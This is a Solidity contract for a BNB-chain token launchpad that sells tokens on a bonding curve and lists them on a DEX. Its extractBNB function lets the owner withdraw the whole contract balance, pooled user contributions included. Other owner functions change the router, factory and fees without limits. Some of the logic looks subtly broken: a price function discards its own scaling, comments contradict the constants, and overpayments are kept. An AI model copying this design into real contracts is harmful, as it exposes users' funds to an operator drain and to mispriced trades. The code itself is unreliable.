// SPDX-License-Identifier: MIT
// Version: 1.1.1

pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "./Token.sol"; 
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/Math.sol";


interface ITokenFactory {
    function deployToken(
        string calldata name,
        string calldata symbol,
        uint256 initialSupply
    ) external returns (address);

    function launch(
        address token,
        address newOwner        
    ) external ;

}

 

contract ContributeContract is Ownable {

    receive() external payable {}
    struct Project {
        string id;
        string name;
        string symbol;
        uint256 decimals;    
        uint256 status;
        address owner;
        uint256 contribution;
        bool isToken;
        address token;
    }


    uint256 public constant INITIAL_SUPPLY = 1e9 ether; // initial supply
    uint256 public  REQUIRE_TOKEN_SELL = 600e6 ether; // require sell
    uint256 public  REQUIRE_TOKEN_LIQUIIDTY = 400e6 ether; // require sell 

    uint256 public constant TOTAL_TOKENS = 600_000_000 ether;  // Total tokens for sale
    uint256 public constant TOTAL_RAISE = 8_000 ether;  // Target raise amount: 25.9 BNB
    uint256 public constant MIN_TOTAL_RAISE = 7_999 ether;  // Target raise amount: 25.9 BNB
    
 

    uint public constant P0_SCALING_FACTOR = 1e21;
    uint public P0 = 6666666666666667;    
    uint public constant DELTA_SCALING_FACTOR = 1e56;
    uint public constant FORCED_TUNNING = 1e6;


    uint256 public projectRequiredCap = 7999000000000000000000 ;
    uint256 public decimals = 18;

    mapping(string => Project) public projects;
    mapping(string => uint256) public tokensSold;
 
    Project[] public projectsArray;
    
    // Controllable by function
    IERC20 public alternateToken  ;
 

    uint256 public coinFee = 1e15; 
    uint256 public dexFee = 150000000000000000000; 
    // uint256 public tierOneFee = 1e15; 
    // uint256 public tierTwoFee = 1e15; 
    // uint256 public tierThreeFee = 1e15 ;

    address public devFeeWallet ;
    address public marketingFeeWallet ;
    address public tradeFeeWallet ;
    address public dexFeeWallet ;
 
    uint256 public devFeeShare = 6000 ;
    uint256 public marketingFeeShare = 4000;
    address public BNB_USDT_PAIR = 0xd24f5b6fA3064022A07c0D5dBE875a0e1AFB4354;    
    ITokenFactory public factory;
    IUniswapV2Router02 public  uniswapRouter = IUniswapV2Router02(0x74F56a7560eF0C72Cf6D677e3f5f51C2D579fF15);
    uint256 buyFee = 100;
    uint256 sellFee = 100;
 


    event ProjectCreated(
        string id,
        uint256 timestamp,
        address token
       );
    
    event ProjectContributed(
        string  id,
        address user,
        uint256 amount,
        uint256 numTokens,
        uint256 timestamp,
        uint256 openPrice,
        uint256 closePrice
        );

            
    event ProjectSold(
        string  id,
        address user,
        uint256 amount,
        uint256 numTokens,
        uint256 timestamp,
       uint256 openPrice,
        uint256 closePrice
        );

    event ProjectMoved(
        string  id,        
        uint256 timestamp  
    );


  
    constructor(address factoryAddress) Ownable(msg.sender) {
    // constructor() Ownable(msg.sender) {
        // feeWallet = _owner;
        devFeeWallet = msg.sender;
        marketingFeeWallet = msg.sender;
        tradeFeeWallet = msg.sender;
        dexFeeWallet = msg.sender; 
         
        factory = ITokenFactory(factoryAddress);
       
    }   


    function numerator() public view returns (uint) {
        return 2 * (TOTAL_RAISE - (P0 * TOTAL_TOKENS) / P0_SCALING_FACTOR);
    }

    function denominator() public view returns (uint) {
        return (TOTAL_TOKENS * (TOTAL_TOKENS - 1 ether));
    }

    function deltaP() public view returns (uint) {
        uint num = numerator();
        uint den = denominator();
        return Math.mulDiv(num, DELTA_SCALING_FACTOR, den);
    }



     function getBNBPrice() public view returns (uint256) {
        IUniswapV2Pair pair = IUniswapV2Pair(BNB_USDT_PAIR);
        (uint256 reserve0, uint256 reserve1, ) = pair.getReserves();
        
        // Assuming BNB is token0 and USDT is token1
        // Adjust accordingly if it's the opposite
        uint256 price = (reserve0 * 1e18) / reserve1; // Price of 1 BNB in USDT
        return price;
        // return 524e18;
    }

    


     function getMarketCap(string memory _projectId) public view returns (uint256 _marketCap) {
         _marketCap =  getCurrentPrice(_projectId) * INITIAL_SUPPLY;   
        return _marketCap;
    }


    function getDeploymentFee() public view returns(uint256) {
         return coinFee; 
    }
 
 


    function calculateTokensForBNB(string memory _projectId,uint256 bnbAmount) public view returns (uint) {
        uint localdeltaP = deltaP();

        uint A = Math.ceilDiv(localdeltaP, 2);
        uint normalA = Math.ceilDiv(A, DELTA_SCALING_FACTOR);

        uint deltaP_times_someFactor = localdeltaP * tokensSold[_projectId] * P0_SCALING_FACTOR;
        uint half_delta = (localdeltaP * P0_SCALING_FACTOR) / 2;
        uint p0 = P0 * DELTA_SCALING_FACTOR;
        uint B = (p0 + deltaP_times_someFactor - half_delta) / DELTA_SCALING_FACTOR; 

        int256 C = negated(bnbAmount);

        int256 B_powered = int(B ** 2) * 1e14; 
        int256 A_times_C_times_4 = int256(A) * C * 4; 

        int256 discriminant = (B_powered - A_times_C_times_4); 
        if (discriminant < 0) {
            return (0);
        }

        uint sqrtDiscriminant = Math.sqrt(uint(discriminant)); 
        uint scaled_sqrtDiscriminant = sqrtDiscriminant * 1e28;
        uint scaled_B = B * 1e35;

        uint n = (scaled_sqrtDiscriminant - scaled_B) / (A * 2);
        return (n);
    }

    function calculateBNBForTokens(string memory _projectId, uint256 tokens) public view returns (uint) {
        if (tokens < 1 ether) {
            return 0;
        }

        uint localdeltaP = deltaP();
        uint n0 = tokensSold[_projectId];
        uint n = tokens;

        uint n_factor_p0 = n * P0; 
        uint scaled_n_factor_p0 = n_factor_p0 / P0_SCALING_FACTOR;

        uint halfNMinusOne = (n - 1 ether) / (2);
        uint adjustedN0 = n0 + halfNMinusOne;
        uint nAdjustedProduct = (n * adjustedN0) / FORCED_TUNNING;

        uint result = localdeltaP * nAdjustedProduct; 
        uint scaled_result = result / 1e50;

        uint totalCost = scaled_n_factor_p0 + scaled_result;
        return totalCost;
    }

    function calculateCumulativeCost(uint n) public view returns (uint) {
        if (n < 1 ether) {
            return 0;
        }
        uint localdeltaP = deltaP(); 
        uint nMinusOne = n - 1 ether;
        uint nTimesNMinusOne = (n * nMinusOne);
        uint halfNTimesNMinusOne = (nTimesNMinusOne / 2) / FORCED_TUNNING;
        uint deltaPTimesHalf = localdeltaP * halfNTimesNMinusOne; 
        uint scaled_deltaPTimesHalf = deltaPTimesHalf / 1e50; 
        uint nTimesP0 = n * P0;
        uint scaled_nTimesP0 = nTimesP0 / P0_SCALING_FACTOR;
        uint result = scaled_nTimesP0 + scaled_deltaPTimesHalf;
        return result;
    }

    function getCurrentPrice(string memory _projectId) public view returns (uint) {
        uint localdeltaP = deltaP();
        uint deltaPTimesTokensSold = localdeltaP * tokensSold[_projectId]; 
        uint scaled_deltaPTimesTokensSold = deltaPTimesTokensSold / 1e35;

        uint result = P0 + scaled_deltaPTimesTokensSold;
        uint scaled_result = result / P0_SCALING_FACTOR; 
        return result;
    }


    function getBuyTokens(string memory _projectId,bool isToken, uint256 x) public view returns (uint, uint) {
        if (x <= 0) {
            return (0, 0);
        }
        if (projects[_projectId].contribution > TOTAL_RAISE) {
            return (0, 0);
        }

        uint remainingBNB = TOTAL_RAISE - projects[_projectId].contribution;
        uint BNBToUse = Math.min(x, remainingBNB);

        uint tokensToBuy = calculateTokensForBNB(_projectId,BNBToUse);

        uint tokensAvailable = TOTAL_TOKENS - tokensSold[_projectId];
        uint actualTokensToBuy = Math.min(tokensToBuy, tokensAvailable);

        uint actualBNBUsed = calculateBNBForTokens(_projectId,actualTokensToBuy);

        return (actualTokensToBuy, actualBNBUsed);
    }

    function getSellTokens(string memory _projectId,bool isToken,uint256 tokensAmount) public view returns (uint256,uint256) {
        if (tokensAmount <= 0 || tokensAmount > tokensSold[_projectId]) {
            return (0,0);
        }

        uint BNBBeforeSale = calculateCumulativeCost(tokensSold[_projectId]);
        uint BNBAfterSale = calculateCumulativeCost(tokensSold[_projectId] - tokensAmount);
        uint BNBReturned = BNBBeforeSale - BNBAfterSale;
        return (BNBReturned,0);
    }

    function negated(uint amount) public view returns (int) {
        int256 negativeValue = -int256(amount);
        return negativeValue;
    }
 
  
  function min(uint256 a, uint256 b) public pure returns (uint256) {
        return a < b ? a : b;
    }

 
 

    function getBuyFee(uint256 _amount,bool isToken) public view returns(uint256 _buyFee) {
        // if(isToken){
        //     return tierOneFee ;
        // }
        // else{
            // uint256 bnbDollar =   getBNBPrice();
            // return tierOneFee*1e18/bnbDollar ;     
            return  (buyFee*_amount/10000);
        // }
    }

    function getSellFee(uint256 _amount,bool isToken) public view returns(uint256 _sellfee) {
        //  if(isToken){
        //      return tierOneFee ;    
        // }
        // else{
            // uint256 bnbDollar =   getBNBPrice();
            // return tierOneFee*1e18/bnbDollar;  
            return  (sellFee*_amount/10000);

        // } 
    }
 


    /*****
    External functions
    *****/ 


    /* Create Project */
    function createPool(string memory _id,string memory _name,string memory _symbol,bool isToken, uint256 _amount,uint256 slippage,uint256 estReturn) public payable{
        require(msg.value >= getDeploymentFee(), "insufficient fee");
        uint256 __coinFee = getDeploymentFee() ; 
        uint256 _devFee = __coinFee * devFeeShare / 10000 ; 
        uint256 _marketingFee = __coinFee * marketingFeeShare / 10000 ; 
        bool devFeesent =  payable(devFeeWallet).send(_devFee);
        require(devFeesent, "Failed to send Ether");
        bool marketingFeesent =  payable(marketingFeeWallet).send(_marketingFee);
        require(marketingFeesent, "Failed to send Ether");

        address _token = factory.deployToken(_name, _symbol, INITIAL_SUPPLY);
        projects[_id] = Project(
            _id,
            _name,
            _symbol,
            decimals,
            1,
            msg.sender,
            0,
            isToken,
            _token
        );
        projectsArray.push(Project(
            _id,
            _name,
            _symbol,
            decimals,
            1,
            msg.sender,
            0,
            isToken,
            _token
        ));
 

        if(_amount > 0){
        buyTokens(_id,_amount,slippage,estReturn);
        }
        emit ProjectCreated(_id,block.timestamp,_token);
    }

    /* Buy tokens */
     function buyTokens(string memory _id,uint256 _amount,uint256 slippage, uint256 estReturn) public payable {

        // Project memory _project = projects[_id];
        require(projects[_id].contribution + _amount <= TOTAL_RAISE, "Market Cap reached");
        require(projects[_id].status == 1, "Project not active");
        // (uint256 numTokens,uint256 _lastRate) = getBuyTokens(_id,projects[_id].isToken,_amount);
        // lastRate[_id] = 0 ; 
        uint256 openPrice = getCurrentPrice(_id);
        uint256 buyFee = getBuyFee(_amount, projects[_id].isToken);
        // _amount = _amount - buyFee ; 

        // uint remainingBNB = TOTAL_RAISE - projects[_id].contribution;
        uint BNBToUse = Math.min(_amount, (TOTAL_RAISE - projects[_id].contribution));

        uint tokensToBuy = calculateTokensForBNB(_id,BNBToUse);

        uint tokensAvailable = TOTAL_TOKENS - tokensSold[_id];
        uint numTokens = Math.min(tokensToBuy, tokensAvailable);

        uint actualBNBUsed = calculateBNBForTokens(_id,numTokens);

        uint256 _slippage = (slippage*estReturn)/10000 ; 

        require(numTokens >= (estReturn -  _slippage), "Please increase Slippage");
        require(numTokens <= (estReturn +  _slippage), "Please increase Slippage");

        
        if(numTokens > REQUIRE_TOKEN_SELL - tokensSold[_id] && tokensSold[_id] > 0){
            numTokens = REQUIRE_TOKEN_SELL - tokensSold[_id]; 
        }
        // if(_project.isToken){ 

        //     uint256 buyFee = getBuyFee(_amount, _project.isToken);
        //     require(alternateToken.balanceOf(msg.sender) >= (buyFee + _amount), "insufficient fee");
        //     alternateToken.transferFrom(msg.sender,address(this),_amount);

        //     alternateToken.transferFrom(msg.sender,tradeFeeWallet,buyFee);  // Take Fee
        // }
        // else{
            require(msg.value >= (buyFee + _amount), "insufficient fee");
            // require(msg.value >= (buyFee), "insufficient fee");
            require(_amount > 0 , "Contribution can't be zero");
            bool sent =  payable(tradeFeeWallet).send(buyFee);
            require(sent, "Failed to send Ether");

        // }
        projects[_id].contribution = projects[_id].contribution + actualBNBUsed;
        // userContribution[_id][msg.sender] = userContribution[_id][msg.sender] + actualBNBUsed;
        

        // Transfer Tokens
        IERC20(projects[_id].token).transfer(msg.sender, numTokens);

        
        // Update the number of tokens sold
        tokensSold[_id] += numTokens;
     
        uint256 closePrice = getCurrentPrice(_id);

        if(projects[_id].contribution >= MIN_TOTAL_RAISE){
            moveProject(_id);
        }

        emit ProjectContributed(_id, msg.sender, _amount,numTokens, block.timestamp,openPrice,closePrice);
        
    }

 


    function sellTokens(string memory _id,uint256 numTokens,uint256 slippage, uint256 estReturn) public payable {
        Project memory _project = projects[_id];
        require(IERC20(projects[_id].token).balanceOf(msg.sender) >= numTokens, "Insufficient token balance");        
        require(projects[_id].status == 1, "Project not active");

        // (uint256 refundAmount,uint256 _newPrice)  = getSellTokens(_id,projects[_id].isToken,numTokens); 
        uint256 openPrice = getCurrentPrice(_id);
        uint BNBBeforeSale = calculateCumulativeCost(tokensSold[_id]);
        uint BNBAfterSale = calculateCumulativeCost(tokensSold[_id] - numTokens);
        uint refundAmount = BNBBeforeSale - BNBAfterSale;

        uint256 _slippage = (slippage*estReturn)/10000 ; 

        require(refundAmount >= (estReturn -  _slippage), "Please increase Slippage");
        require(refundAmount <= (estReturn +  _slippage), "Please increase Slippage");


        // uint256 _amount = 0 ; 
        //  lastRate[_id] = 0 ; 
        if(_project.isToken){
                refundAmount = refundAmount * getBNBPrice();
        }
        uint256 sellFee = getSellFee(refundAmount, _project.isToken);
      
        uint256 balance = projects[_id].contribution;
        if(refundAmount > balance){
            refundAmount = balance ;         
        }
        
        if(_project.isToken){
            // require(refundAmount >= 10e18, "Minimum Sell is $10"); 
            require(alternateToken.balanceOf(msg.sender) >= sellFee, "insufficient fee");
            require(alternateToken.balanceOf(address(this)) >= refundAmount, "Insufficient contract balance");
            if(refundAmount > 0){
            alternateToken.transfer(msg.sender,refundAmount);
            }
            if(sellFee > 0){
            alternateToken.transferFrom(msg.sender,tradeFeeWallet,sellFee);  // Take Fee
            }

        }
        else{

            // require(msg.value >= sellFee, "insufficient fee");
            require(projects[_id].contribution >= refundAmount, "Insufficient contract balance");    
            if(refundAmount > 0){
            bool sent = payable(msg.sender).send(refundAmount-sellFee);
            require(sent, "Failed to send Ether: refund");
            }
            if(sellFee > 0){
             bool feesent =  payable(tradeFeeWallet).send(sellFee);
            require(feesent, "Failed to send Ether: fee");
            }
            
        }
        IERC20(projects[_id].token).transferFrom(msg.sender, address(this),numTokens);
        projects[_id].contribution = projects[_id].contribution - refundAmount;
        // userContribution[_id][msg.sender] = userContribution[_id][msg.sender] - refundAmount;
        // Update the number of tokens sold
        tokensSold[_id] -= numTokens;
     
        // uint256 _numTokens = listingRate ; 
        // if((TOTAL_RAISE - projects[_id].contribution) > 1e18){
        // (uint256 _numTokens,uint256 __lastRate) = getcurre(_id,projects[_id].isToken,1e18);
        uint256 closePrice = getCurrentPrice(_id);

            // _numTokens = __numTokens;
        // }
        


        emit ProjectSold(_id, msg.sender, refundAmount,numTokens, block.timestamp,openPrice,closePrice);
    }

 

 


    /* Move Project on Dex */
    //  Include fees on liquiidty add
    //  remaini
    function moveProject(string memory _id) public {
        Project memory _project = projects[_id];
        require(projects[_id].contribution >= projectRequiredCap, "Contrubution needs more contribution");
        factory.launch(_project.token,_project.owner);

        uint256 totalAmount = projectRequiredCap;
        uint256 _dexFee =  dexFee ;
        uint256 _LIQUIDITY_AMOUNT = totalAmount - _dexFee ;  

        // code to add liquidity
        // uint256 tokenPrice = getPrice(_id,_project.isToken);
        uint256 tokenAmount = REQUIRE_TOKEN_LIQUIIDTY;
        addLiquidity(_project.token,tokenAmount,_LIQUIDITY_AMOUNT,0,0,block.timestamp + 300);
        // uint256 _amount = totalAmount - _LIQUIDITY_AMOUNT;

        // Take fee
        if(_project.isToken){
            alternateToken.transfer(dexFeeWallet,_dexFee);
        }
        else{
            bool sent = payable(dexFeeWallet).send(_dexFee);
            require(sent, "Failed to send Ether");
        }
        projects[_id].status = 2;
        emit ProjectMoved(_id, block.timestamp);
    }


    function addLiquidity(
        address tokenAddress,
        uint256 tokenAmount,
        uint256 ethAmount,
        uint256 tokenAmountMin,
        uint256 ethAmountMin,
        uint256 deadline
    ) public payable  {
        Token token = Token(tokenAddress);

        // Approve the Uniswap router to spend the specified token amount
        require(token.approve(address(uniswapRouter), tokenAmount), "Token approval failed");

        // Add liquidity to Uniswap
       uniswapRouter.addLiquidityETH{value: ethAmount}(
            tokenAddress,
            tokenAmount,
            tokenAmountMin,
            ethAmountMin,
            address(this),
            deadline
        );
    
}

    // Controllable Fucntions

function setAlternateTokens(IERC20 _token) public onlyOwner{
    alternateToken = _token;
}

function setPriceParams(address _pairToken,IUniswapV2Router02 _uniswapRouter,ITokenFactory _factory) public onlyOwner{
    BNB_USDT_PAIR = _pairToken;
    uniswapRouter = _uniswapRouter;
    factory = _factory;
}

function setPoolConfig(uint256 _projectRequiredContribution, uint256 _requiredSell,uint256 _requiredTokenLiquidity,uint256 _START_PRICE)  public onlyOwner{
    projectRequiredCap = _projectRequiredContribution ; 
    REQUIRE_TOKEN_SELL = _requiredSell ; 
    REQUIRE_TOKEN_LIQUIIDTY = _requiredTokenLiquidity ;   
}


// function setProjectConfig(uint256 _initialPrice, uint256 _maxPrice, uint256 _c) public onlyOwner {
//     INITIAL_PRICE = _initialPrice ; 
//     MAX_PRICE = _maxPrice ; 
//     c = _c ; 
// }


function setDepFeeShare(uint256 _devFeeShare,uint256 _marketingFeeShare) public onlyOwner{
    require(_devFeeShare + _marketingFeeShare == 10000, "Nummbers sum should be 10000");
    devFeeShare = _devFeeShare;
    marketingFeeShare = _marketingFeeShare;
}

// function setFees(uint256 _tierOne,uint256 _tierTwo,uint256 _tierThree,uint256 _coinFee) public onlyOwner{
//     tierOneFee = _tierOne;
//     tierTwoFee = _tierTwo;
//     tierThreeFee = _tierThree;
//     coinFee = _coinFee;
// }


function setFees(uint256 _dexFee,uint256 _buyeFee, uint256 _sellFee, uint256 _coinFee) public onlyOwner{
    // tierOneFee = _tierOne;
    buyFee = _buyeFee;
    sellFee = _sellFee;
    dexFee = _dexFee;
    coinFee = _coinFee;
}

 
function setFeeWallets(address _devFeeWallet,address _marketingFeeWallet,address _tradeFeeWallet,address _dexFeeWallet) public onlyOwner{
    devFeeWallet = _devFeeWallet;
    marketingFeeWallet = _marketingFeeWallet;
    tradeFeeWallet = _tradeFeeWallet;
    dexFeeWallet = _dexFeeWallet;
}


function extractBNB() public onlyOwner{
            require(address(this).balance >= 0, "Insufficient contract balance");           
            bool sent = payable(msg.sender).send(address(this).balance);
            require(sent, "Failed to send Ether");
}


}